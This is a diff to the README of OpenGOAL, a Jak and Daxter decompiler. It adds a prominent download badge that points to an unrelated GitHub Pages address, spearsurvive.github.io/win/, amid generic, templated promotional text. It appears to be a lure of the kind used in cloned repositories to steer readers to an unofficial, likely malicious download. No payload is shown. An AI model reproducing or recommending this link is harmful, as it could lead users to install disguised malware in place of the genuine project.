@@ -30,6 +30,12 @@ OpenGOAL decompiles and recompiles the original Jak and Daxter PS2 code to nativ
 
 Whether you're a newcomer or a veteran, OpenGOAL provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download OpenGOAL](https://img.shields.io/badge/⬇_DOWNLOAD_OpenGOAL-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
